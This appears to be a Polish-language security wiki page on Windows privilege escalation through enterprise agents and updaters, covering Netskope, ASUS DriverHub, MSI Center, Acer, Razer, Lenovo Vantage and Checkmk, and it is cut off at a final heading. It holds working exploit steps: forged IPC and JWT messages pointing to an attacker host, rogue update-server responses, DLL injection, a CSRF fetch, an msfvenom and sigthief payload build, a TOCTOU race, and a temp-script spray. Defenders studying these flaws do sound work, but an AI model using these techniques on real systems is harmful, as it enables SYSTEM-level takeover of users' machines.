# Nadużywanie korporacyjnych automatycznych aktualizatorów i uprzywilejowanego IPC (np. Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ta strona opisuje ogólną klasę łańcuchów eskalacji uprawnień lokalnych w systemie Windows, występujących w korporacyjnych agentach endpointowych i aktualizatorach, które udostępniają łatwo dostępny interfejs IPC oraz uprzywilejowany mechanizm aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), w którym użytkownik z niskimi uprawnieniami może wymusić rejestrację na serwerze kontrolowanym przez atakującego, a następnie dostarczyć złośliwy plik MSI instalowany przez usługę SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Najważniejsze pomysły, które można wykorzystać przeciwko podobnym produktom:
- Nadużyj localhost IPC uprzywilejowanej usługi, aby wymusić ponowną rejestrację lub zmianę konfiguracji na serwer atakującego.
- Zaimplementuj endpointy aktualizacji dostawcy, dostarcz złośliwy Trusted Root CA i wskaż aktualizatorowi złośliwy, „podpisany” pakiet.
- Omiń słabe kontrole sygnatariusza (listy dozwolonych CN), opcjonalne flagi digest i pobłażliwe właściwości MSI.
- Jeśli IPC jest „zaszyfrowane”, wyprowadź klucz/IV z publicznie dostępnych identyfikatorów komputera przechowywanych w rejestrze.
- Jeśli usługa ogranicza wywołujących na podstawie ścieżki obrazu/nazwy procesu, wstrzyknij kod do procesu z listy dozwolonych albo uruchom taki proces w stanie wstrzymania i załaduj DLL za pomocą minimalnej poprawki kontekstu wątku.

Niestandardowe lokalne usługi TCP wymagają takiej samej weryfikacji tożsamości i granic danych wejściowych, nawet jeśli wymagają PIN-u lub innych danych uwierzytelniających aplikacji. Ustal, z jakim procesem i efektywnym kontem usługi powiązany jest listener, a następnie sprawdź dokładny wdrożony plik binarny i jego wersję oraz to, czy pola kontrolowane przez wywołującego są sprawdzane pod kątem długości przed skopiowaniem do buforów o stałym rozmiarze lub użyciem do skonstruowania polecenia procesu potomnego. [Wskazówki Microsoft dotyczące przepełnień bufora](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) wyjaśniają, dlaczego niesprawdzane dane zewnętrzne są niebezpieczne w uprzywilejowanym kodzie natywnym. Listener nasłuchujący na loopback, zakodowane na stałe dane uwierzytelniające ani sama nazwa procesu nie dowodzą występowania uszkodzenia pamięci lub możliwości wykonania kodu jako SYSTEM; osiągalność, autoryzacja, ścieżka kodu i mechanizmy łagodzące ryzyko to odrębne warunki. Rutynowe rozpoznanie powinno pozostać pasywne — nie wysyłaj do działającej usługi danych wejściowych o długości mogącej spowodować awarię.

---
## 1) Wymuszanie rejestracji na serwerze atakującego przez localhost IPC

Wiele agentów zawiera proces interfejsu użytkownika w trybie użytkownika, który komunikuje się z usługą SYSTEM przez localhost TCP, używając JSON.

Zaobserwowano w Netskope:
- UI: stAgentUI (niski poziom integralności) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Przebieg exploita:
1) Przygotuj token rejestracyjny JWT, którego claims kontrolują host backendu (np. AddonUrl). Użyj alg=None, aby nie był wymagany podpis.
2) Wyślij komunikat IPC wywołujący polecenie rejestracji z Twoim JWT i nazwą tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Usługa zaczyna łączyć się z Twoim nieuczciwym serwerem w celu pobrania danych rejestracyjnych/konfiguracji, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Uwagi:
- Jeśli weryfikacja wywołującego jest oparta na ścieżce/nazwie, wyślij żądanie z dozwolonego binarium dostawcy (zob. §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Przejęcie kanału aktualizacji w celu uruchomienia kodu jako SYSTEM

Gdy klient połączy się już z Twoim serwerem, zaimplementuj oczekiwane endpointy i skieruj go na MSI atakującego. Typowa sekwencja:

1) /v2/config/org/clientconfig → Zwróć konfigurację JSON z bardzo krótkim interwałem aktualizacji, np.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Zwróć certyfikat CA w formacie PEM. Usługa zainstaluje go w magazynie Local Machine Trusted Root.
3) /v2/checkupdate → Podaj metadane wskazujące na złośliwy plik MSI i fałszywą wersję.

Omijanie typowych kontroli spotykanych w praktyce:
- Lista dozwolonych wartości Signer CN: usługa może sprawdzać tylko, czy Subject CN jest równy „netSkope Inc” lub „Netskope, Inc.”. Własny CA może wystawić certyfikat leaf z takim CN i podpisać plik MSI.
- Właściwość CERT_DIGEST: dodaj nieszkodliwą właściwość MSI o nazwie CERT_DIGEST. Podczas instalacji nie jest ona weryfikowana.
- Opcjonalna weryfikacja digest: flaga konfiguracyjna (np. check_msi_digest=false) wyłącza dodatkową walidację kryptograficzną.

Wynik: usługa SYSTEM instaluje plik MSI z lokalizacji
C:\ProgramData\Netskope\stAgent\data\*.msi
i wykonuje dowolny kod jako NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Wniosek dotyczący omijania poprawek: jeśli dostawca odpowiada, dodając do listy dozwolonych niewielką grupę „zaufanych” domen zamiast kryptograficznie uwierzytelniać źródło aktualizacji, poszukaj należących do dostawcy redirectorów lub reverse proxy, które nadal pozwalają kierować ruch. W przypadku Netskope późniejsze publiczne badania wykazały, że lista dozwolonych z epoki R129 nadal mogła zostać wykorzystana za pośrednictwem `rproxy.goskope.com`, który przekazywał treści z Azure App Service kontrolowane przez atakującego. Traktuj listy dozwolonych nazw hostów jako przeszkodę, a nie granicę zaufania.<sup>[[14]](#references)</sup>

---
## 3) Fałszowanie zaszyfrowanych żądań IPC (jeśli występują)

Począwszy od R127, Netskope opakowywał JSON IPC w pole encryptData przypominające Base64. Analiza wsteczna wykazała, że użyto AES z kluczem i IV wyprowadzonymi z wartości rejestru dostępnych dla każdego użytkownika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atakujący mogą odtworzyć szyfrowanie i wysyłać prawidłowe zaszyfrowane polecenia ze zwykłego konta użytkownika.<sup>[[1]](#references)[[2]](#references)</sup> Ogólna wskazówka: jeśli agent nagle zaczyna „szyfrować” swoje IPC, poszukaj identyfikatorów urządzeń, GUID-ów produktów i identyfikatorów instalacji w HKLM — mogą służyć jako materiał kryptograficzny.

---
## 4) Omijanie list dozwolonych wywołujących IPC (kontrole ścieżki/nazwy)

Niektóre usługi próbują uwierzytelnić peer, pobierając PID połączenia TCP i porównując ścieżkę/nazwę obrazu z listą dozwolonych plików binarnych dostawcy znajdujących się w Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne sposoby obejścia:
- Wstrzyknięcie DLL do procesu znajdującego się na liście dozwolonych (np. nsdiag.exe) i przekazywanie żądań IPC z jego wnętrza.
- Uruchomienie pliku binarnego z listy dozwolonych w stanie wstrzymania i zainicjowanie działania proxy DLL bez CreateRemoteThread (zob. §5), aby spełnić reguły ochrony przed manipulacją wymuszane przez sterownik.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Wstrzykiwanie zgodne z ochroną przed manipulacją: wstrzymany proces + poprawka NtContinue

Produkty często zawierają sterownik minifilter/OB callbacks (np. Stadrv), który odbiera niebezpieczne uprawnienia uchwytom do chronionych procesów:
- Proces: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Wątek: ogranicza uprawnienia do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny loader działający w trybie użytkownika, który respektuje te ograniczenia:
1) Utwórz proces pliku binarnego dostawcy z flagą CREATE_SUSPENDED.
2) Uzyskaj uchwyty, do których nadal masz dostęp: PROCESS_VM_WRITE | PROCESS_VM_OPERATION dla procesu oraz uchwyt wątku z THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (albo tylko THREAD_RESUME, jeśli poprawiasz kod pod znanym RIP).
3) Nadpisz ntdll!NtContinue (lub inny wczesny, gwarantowanie zmapowany thunk) krótkim stubem, który wywołuje LoadLibraryW ze ścieżką do Twojej DLL, a następnie wraca.
4) Wywołaj ResumeThread, aby uruchomić stub w procesie i załadować DLL.

Ponieważ nie użyto PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME na już chronionym procesie (został utworzony przez Ciebie), polityka sterownika jest spełniona.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktyczne narzędzia
- NachoVPN (plugin Netskope) automatyzuje tworzenie własnego CA, podpisywanie złośliwego pliku MSI i udostępnia wymagane endpointy: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope to własny klient IPC, który tworzy dowolne komunikaty IPC (opcjonalnie szyfrowane AES) i zawiera mechanizm wstrzykiwania do wstrzymanego procesu, aby wysyłać żądania z pliku binarnego znajdującego się na liście dozwolonych.<sup>[[4]](#references)</sup>

## 7) Szybki proces wstępnej analizy nieznanych powierzchni updatera/IPC

W przypadku nowego agenta endpointowego lub zestawu narzędzi „pomocniczych” do płyty głównej zwykle wystarczy szybki proces, by ustalić, czy znaleziony cel nadaje się do privesc:<sup>[[6]](#references)</sup>

1) Wykryj nasłuchujące usługi loopback i ustal, z którymi procesami dostawcy są powiązane:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Wylicz potencjalne named pipes:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Wydobądź dane routingu przechowywane w rejestrze, wykorzystywane przez serwery IPC oparte na pluginach:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Najpierw wyodrębnij nazwy endpointów, klucze JSON i identyfikatory poleceń z klienta działającego w trybie użytkownika. Spakowane frontendy Electron/.NET często leakują pełny schemat:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Znajdź właściwy predykat zaufania, a nie tylko ścieżkę kodu, która ostatecznie uruchamia proces:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Wzorce, którym warto nadać priorytet:
- `CryptQueryObject`/parsowanie certyfikatu bez `WinVerifyTrust` zwykle oznacza, że „certyfikat istnieje” uznano za równoznaczne z „certyfikat jest zaufany”, co umożliwia klonowanie certyfikatów lub inne sztuczki z fałszywym signerem.
- Sprawdzanie podciągów/sufiksów w `Origin`, `Referer`, URL-ach pobierania, nazwach procesów lub CN signerów nie jest uwierzytelnianiem. `contains(".vendor.com")` zwykle da się wykorzystać za pomocą kontrolowanych przez atakującego domen podszywających się pod prawdziwe.
- Jeśli nieuprzywilejowany GUI uznaje „plik jest zaufany”, a broker SYSTEM jedynie korzysta z tego wyniku, patchowanie lub ponowne zaimplementowanie DLL/JS po stronie klienta często całkowicie omija granicę zaufania (podział walidacji w stylu Razera).
- Jeśli broker kopiuje payload do `%TEMP%`/`C:\Windows\Temp`, a następnie waliduje go lub planuje jego uruchomienie z tej ścieżki, od razu sprawdź okna TOCTOU umożliwiające podmianę oraz moduły wtyczek w tym samym katalogu, które udostępniają alternatywne wrappery `ExecuteTask()` z mniej rygorystycznymi kontrolami.<sup>[[6]](#references)</sup>

W przypadku celów intensywnie korzystających z named pipes PipeViewer pozwala szybko wykryć słabe DACL-e i potoki osiągalne zdalnie, zanim zaczniesz szczegółowo analizować protokół metodą reverse engineering.<sup>[[11]](#references)</sup>

Jeśli cel uwierzytelnia wywołujących wyłącznie na podstawie PID, ścieżki obrazu lub nazwy procesu, potraktuj to jako przeszkodę, a nie granicę bezpieczeństwa: wstrzyknięcie kodu do legalnego klienta albo nawiązanie połączenia z procesu znajdującego się na liście dozwolonych często wystarcza, by spełnić warunki serwera. W przypadku named pipes [ta strona o podszywaniu się pod klienta i nadużywaniu potoków](named-pipe-client-impersonation.md) omawia tę technikę dokładniej.

W przypadku uprzywilejowanego **brokera czyszczenia lub przywracania** sprawdź granicę zaufania ścieżki, a także ACL potoku. Mniej uprzywilejowany wywołujący może mieć możliwość wyboru miejsca docelowego przywracania lub zmiany nazwy przygotowanego artefaktu kopii zapasowej we współdzielonym katalogu, nawet gdy plik wykonywalny usługi i jej katalog instalacyjny są chronione. Osobno potwierdź, że wywołujący może wywołać polecenie przywracania, zmodyfikować dokładne przygotowane dane wejściowe lub nazwę pliku, że broker działa z wyższymi uprawnieniami oraz że operacja przywracania faktycznie zapisuje dane w wybranej chronionej lokalizacji. Sam zapisywalny katalog tymczasowy lub potok dostępny do odczytu nie dowodzi możliwości dowolnego zapisu z podwyższonymi uprawnieniami; mapowanie miejsca docelowego i działanie usługi wymagają przeglądu kodu lub kontrolowanych testów. Podczas pasywnego rozpoznania nie uruchamiaj nieznanego polecenia czyszczenia, ponieważ może ono usunąć pliki użytkownika.

---
## 8) Modularne brokeri add-in uwierzytelniane wyłącznie podpisami dostawcy (wzorzec Lenovo Vantage)

Nowszym wariantem, którego warto szukać, jest **broker RPC z uwierzytelnianiem klienta na podstawie podpisu**: nieuprzywilejowany proces desktopowy podpisany przez Lenovo komunikuje się z usługą SYSTEM, a usługa kieruje polecenia JSON do zestawu add-in opisanych plikami XML w `%ProgramData%`. Gdy uda się uzyskać wykonanie kodu **wewnątrz dowolnego zaakceptowanego, podpisanego klienta**, każdy kontrakt `runas="system"` staje się częścią powierzchni ataku.<sup>[[15]](#references)</sup>

Wysokowartościowe prymitywy zaobserwowane w badaniach Lenovo Vantage:
- **Zaufanie do wywołującego, bo jego plik jest podpisany przez dostawcę**: badacze uzyskali uwierzytelniony kontekst, kopiując podpisany przez Lenovo plik EXE do zapisywalnego katalogu i wykorzystując DLL side-loading (`profapi.dll`), aby uruchomić dowolny kod wewnątrz klienta, któremu usługa już ufała.
- **Wykrywanie powierzchni ataku na podstawie manifestów**: add-in są deklarowane w plikach `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; kilka kontraktów działa jako `SYSTEM`, więc enumeracja tych manifestów często szybciej ujawnia rzeczywiste uprzywilejowane operacje niż analiza reverse engineering samego brokera.
- **Błędy poszczególnych poleceń ukryte za uwierzytelnionym kanałem**: po uzyskaniu dostępu do zaufanego klienta publicznie opisane badania wykazały path traversal połączony z race conditions w operacjach aktualizacji/instalacji, nadużycie raw SQL w uprzywilejowanych bazach ustawień oraz sprawdzanie ścieżek rejestru za pomocą podciągów, które umożliwiało zapis poza zamierzonym hive.

Przydatne rozpoznanie celu:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktyczny wniosek: gdy pakiet narzędzi udostępnia broker, który najpierw uwierzytelnia **proces wywołujący**, a dopiero potem kieruje żądania do dziesiątek poleceń wtyczek/dodatków, nie poprzestawaj na obejściu początkowej kontroli zaufania. Zrzutuj tabelę manifestu/kontraktu i niezależnie fuzzuj każde polecenie o wysokich uprawnieniach; uwierzytelniony kanał zwykle skrywa kilka błędów drugiego etapu.

---
## 1) CSRF z przeglądarki do localhost przeciwko uprzywilejowanym API HTTP (ASUS DriverHub)

DriverHub zawiera usługę HTTP działającą w trybie użytkownika (ADU.exe) pod adresem 127.0.0.1:53000, która oczekuje wywołań z przeglądarki pochodzących z https://driverhub.asus.com. Filtr Origin po prostu wykonuje `string_contains(".asus.com")` na nagłówku Origin oraz na adresach URL pobierania udostępnionych przez `/asus/v1.0/*`. Dlatego każda kontrolowana przez atakującego domena, taka jak `https://driverhub.asus.com.attacker.tld`, przechodzi kontrolę i może wysyłać z JavaScriptu żądania zmieniające stan.<sup>[[6]](#references)</sup> Dodatkowe sposoby obejścia opisano w [podstawach CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md).

Praktyczny przebieg:
1) Zarejestruj domenę zawierającą `.asus.com` i umieść na niej złośliwą stronę internetową.
2) Użyj `fetch` lub XHR, aby wywołać uprzywilejowany endpoint (np. `Reboot`, `UpdateApp`) pod adresem `http://127.0.0.1:53000`.
3) Wyślij treść JSON oczekiwaną przez handler — spakowany JS frontendu pokazuje schemat poniżej.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Nawet przedstawione poniżej CLI PowerShell działa poprawnie, gdy nagłówek Origin zostanie sfałszowany tak, by zawierał zaufaną wartość:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Każda wizyta w witrynie atakującego staje się więc lokalnym CSRF wymagającym 1 kliknięcia (lub 0 kliknięć przy użyciu `onload`), który uruchamia pomocniczy proces z uprawnieniami SYSTEM.

---
## 2) Niebezpieczna weryfikacja podpisu kodu i klonowanie certyfikatu (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` pobiera dowolne pliki wykonywalne określone w treści JSON i buforuje je w `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Walidacja adresu URL pobierania używa tej samej logiki wyszukiwania podciągu, więc akceptowany jest adres `http://updates.asus.com.attacker.tld:8000/payload.exe`. Po pobraniu ADU.exe jedynie sprawdza, czy plik PE zawiera podpis i czy ciąg Subject odpowiada ASUS, a następnie go uruchamia — bez `WinVerifyTrust` i bez walidacji łańcucha certyfikatów.

Aby wykorzystać ten mechanizm:
1) Utwórz payload (np. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sklonuj do niego certyfikat podpisującego ASUS (np. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Umieść `pwn.exe` w witrynie z domeną podszywającą się pod `.asus.com` i wywołaj UpdateApp za pomocą opisanego wyżej CSRF z przeglądarki.

Ponieważ zarówno filtry Origin, jak i URL opierają się na wyszukiwaniu podciągu, a kontrola podpisującego jedynie porównuje ciągi, DriverHub pobiera i uruchamia plik binarny atakującego z podwyższonymi uprawnieniami.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU w ścieżkach kopiowania/uruchamiania aktualizatora (MSI Center CMD_AutoUpdateSDK)

Usługa MSI Center działająca z uprawnieniami SYSTEM udostępnia protokół TCP, w którym każda ramka ma postać `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Główny komponent (Component ID `0f 27 00 00`) udostępnia `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Jego procedura obsługi:
1) Kopiuje wskazany plik wykonywalny do `C:\Windows\Temp\MSI Center SDK.exe`.
2) Weryfikuje podpis za pomocą `CS_CommonAPI.EX_CA::Verify` (Subject certyfikatu musi być równy “MICRO-STAR INTERNATIONAL CO., LTD.”, a `WinVerifyTrust` musi zakończyć się powodzeniem).
3) Tworzy zaplanowane zadanie, które uruchamia plik tymczasowy z uprawnieniami SYSTEM i argumentami kontrolowanymi przez atakującego.

Skopiowany plik nie jest blokowany między weryfikacją a wywołaniem `ExecuteTask()`. Atakujący może:
- Wysłać ramkę A wskazującą prawidłowy plik binarny podpisany przez MSI (co gwarantuje przejście kontroli podpisu i zakolejkowanie zadania).
- Wykonać wyścig, wysyłając wielokrotnie ramki B wskazujące złośliwy payload, który nadpisze `MSI Center SDK.exe` tuż po zakończeniu weryfikacji.

Gdy harmonogram uruchomi zadanie, wykona nadpisany payload z uprawnieniami SYSTEM, mimo że zweryfikowano oryginalny plik. Niezawodne wykorzystanie wymaga dwóch goroutines/wątków, które wielokrotnie wysyłają CMD_AutoUpdateSDK, aż do wygrania wyścigu TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Wykorzystywanie własnego IPC z uprawnieniami SYSTEM i impersonacji (MSI Center + Acer Control Centre)

### Zestawy poleceń TCP MSI Center
- Każda wtyczka/DLL załadowana przez `MSI.CentralServer.exe` otrzymuje Component ID zapisane w `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Pierwsze 4 bajty ramki wskazują komponent, co pozwala atakującym kierować polecenia do dowolnych modułów.
- Wtyczki mogą definiować własne mechanizmy uruchamiania zadań. `Support\API_Support.dll` udostępnia `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i bezpośrednio wywołuje `API_Support.EX_Task::ExecuteTask()` **bez weryfikacji podpisu** — każdy użytkownik lokalny może wskazać `C:\Users\<user>\Desktop\payload.exe` i w przewidywalny sposób uzyskać wykonanie z uprawnieniami SYSTEM.
- Nasłuch loopbacku za pomocą Wireshark lub analiza plików binarnych .NET w dnSpy szybko ujawniają mapowanie komponentów na polecenia; następnie można odtwarzać ramki przy użyciu własnych klientów w Go/Pythonie.<sup>[[6]](#references)</sup>

### Nazwane potoki Acer Control Centre i poziomy impersonacji
- `ACCSvc.exe` (SYSTEM) udostępnia `\\.\pipe\treadstone_service_LightMode`, a jego uznaniowa lista ACL zezwala klientom zdalnym na dostęp (np. `\\TARGET\pipe\treadstone_service_LightMode`). Wysłanie identyfikatora polecenia `7` wraz ze ścieżką do pliku wywołuje procedurę usługi uruchamiającą proces.
- Biblioteka klienta serializuje wraz z argumentami bajt kończący o wartości 113. Instrumentacja dynamiczna za pomocą Frida/`TsDotNetLib` (wskazówki dotyczące instrumentacji znajdziesz w [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) pokazuje, że natywna procedura obsługi mapuje tę wartość na `SECURITY_IMPERSONATION_LEVEL` i SID poziomu integralności przed wywołaniem `CreateProcessAsUser`.
- Zastąpienie 113 (`0x71`) wartością 114 (`0x72`) kieruje wykonanie do ogólnej gałęzi, która zachowuje pełny token SYSTEM i ustawia SID wysokiego poziomu integralności (`S-1-16-12288`). Uruchomiony plik binarny działa więc z nieograniczonymi uprawnieniami SYSTEM, lokalnie i na innym komputerze.
- Można połączyć to z udostępnioną flagą instalatora (`Setup.exe -nocheck`), aby uruchomić ACC nawet na laboratoryjnych maszynach wirtualnych i testować potok bez sprzętu producenta.<sup>[[6]](#references)</sup>

Te błędy IPC pokazują, dlaczego usługi localhost muszą wymagać wzajemnego uwierzytelniania (SID ALPC, filtry `ImpersonationLevel=Impersonation`, filtrowanie tokenów) oraz dlaczego mechanizm każdej wtyczki służący do „uruchamiania dowolnego pliku binarnego” powinien stosować te same weryfikacje podpisu.

---
## 3) Pomocnicze mechanizmy COM/IPC typu „elevator” oparte na słabej walidacji w trybie użytkownika (Razer Synapse 4)

Razer Synapse 4 wprowadził kolejny przydatny wariant tego wzorca: użytkownik o niskich uprawnieniach może poprosić pomocnik COM o uruchomienie procesu za pośrednictwem `RzUtility.Elevator`, podczas gdy decyzja o zaufaniu jest podejmowana przez bibliotekę DLL działającą w trybie użytkownika (`simple_service.dll`), zamiast być solidnie egzekwowana w uprzywilejowanym komponencie.

Zaobserwowana ścieżka wykorzystania:
- Utwórz instancję obiektu COM `RzUtility.Elevator`.
- Wywołaj `LaunchProcessNoWait(<path>, "", 1)`, aby zażądać uruchomienia z podwyższonymi uprawnieniami.
- W publicznym PoC kontrola podpisu PE w `simple_service.dll` jest łatana przed wysłaniem żądania, co pozwala uruchomić dowolny plik wykonywalny wybrany przez atakującego.<sup>[[6]](#references)[[10]](#references)</sup>

Minimalne wywołanie w PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Ogólny wniosek: podczas analizowania wstecznego pakietów „helper” nie poprzestawaj na localhost TCP ani named pipes. Sprawdź, czy istnieją klasy COM o nazwach takich jak `Elevator`, `Launcher`, `Updater` lub `Utility`, a następnie zweryfikuj, czy uprzywilejowana usługa sama sprawdza plik binarny będący celem, czy jedynie ufa wynikowi obliczonemu przez podatną na modyfikacje bibliotekę DLL klienta działającą w trybie użytkownika. Ten wzorzec występuje nie tylko w Razer: każdy podzielony projekt, w którym broker o wysokich uprawnieniach korzysta z decyzji zezwalającej lub odmawiającej dostępu, podjętej po stronie o niskich uprawnieniach, może stanowić wektor privesc.


---
## Przewidywalne uruchamianie skryptu tymczasowego podczas naprawy MSI (Checkmk Agent / CVE-2024-0670)

Niektóre agenty Windows nadal wykonują uprzywilejowane działania, zapisując tymczasowy plik `.cmd` w `C:\Windows\Temp` i uruchamiając go jako `SYSTEM`. Jeśli nazwa pliku jest przewidywalna, a usługa nie odtwarza bezpiecznie istniejących plików, użytkownik o niskich uprawnieniach może wcześniej utworzyć przyszły plik tymczasowy jako **tylko do odczytu** i sprawić, że uprzywilejowany proces wykona treść kontrolowaną przez atakującego zamiast własnego skryptu.

Zaobserwowano w podatnych wersjach Checkmk Agent:
- wzorzec pliku tymczasowego: `cmk_all_<PID>_1.cmd`
- podatne gałęzie: `2.0.0`, `2.1.0`, `2.2.0`
- wyzwalacz: **naprawa** buforowanego pakietu agenta MSI<sup>[[8]](#references)[[9]](#references)</sup>

Praktyczny przebieg:
1. Oszacuj realistyczny zakres PID na podstawie bieżących identyfikatorów procesów lub PID działającego agenta.
2. Zapisz krótki ładunek `.cmd` w **ASCII** (`Set-Content -Encoding Ascii` lub przekierowanie `cmd.exe`; unikaj zapisu PowerShell w UTF-16 w przypadku plików batch).
3. Wykonaj spray plików `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dla wybranego zakresu kandydatów i oznacz każdy plik jako tylko do odczytu.
4. Wyzwól naprawę buforowanego MSI, aby uprzywilejowana usługa spróbowała odtworzyć, a następnie uruchomiła tymczasowy skrypt.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Jeśli podatny produkt został zainstalowany za pomocą Windows Installer, przed uruchomieniem naprawy ustal nazwę produktu odpowiadającą losowo wyglądającemu, buforowanemu plikowi MSI w `C:\Windows\Installer`:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Uwagi operacyjne:
- `qwinsta` jest przydatne, gdy `msiexec /fa` zawodzi w nieinteraktywnej powłoce WinRM i trzeba ustalić, czy istniejąca sesja pulpitu/rozłączona sesja może poprawnie uruchomić naprawę.<sup>[[7]](#references)</sup>
- Ten schemat można uogólnić na inne agenty endpointowe i updatery, które **umieszczają tymczasowe skrypty w lokalizacjach zapisywalnych przez wszystkich, a następnie wykonują je jako SYSTEM**. Sprawdź przewidywalne nazwy, brak semantyki wyłącznego tworzenia oraz możliwość wyzwolenia na żądanie przepływów naprawy/aktualizacji.

### Interaktywna naprawa instalatora i uprzywilejowana konsola

PDF24 Creator 11.15.1 ilustruje odrębne ryzyko związane z naprawą MSI: niestandardowa akcja instalująca drukarkę może podczas naprawy uruchomić widoczną konsolę z uprawnieniami SYSTEM. Wersja 11.15.2 instalatora MSI została zmieniona przez dostawcę, aby rozwiązać ten problem. Starsza wersja produktu to jedynie wskazówka do dalszej analizy. Sprawdź zarejestrowany lub dostępny pakiet MSI, czy użytkownik może zainicjować naprawę, czy występują podatna niestandardowa akcja i opóźnienie zapisu pliku dziennika oraz czy interaktywny pulpit może ujawnić konsolę. Zgłoszone opóźnienie uzyskano za pomocą oplock na `faxPrnInst.log`; zwykła możliwość zapisu pliku nie jest jedynym warunkiem dostępu. Nieinteraktywna powłoka, niedostępny pakiet lub załatany instalator mogą przerwać łańcuch. Ten problem nie zależy od `AlwaysInstallElevated` i różni się od podmiany przewidywalnego skryptu tymczasowego.

---
## Zdalne przejęcie łańcucha dostaw przez słabą walidację aktualizatora (WinGUp / Notepad++)

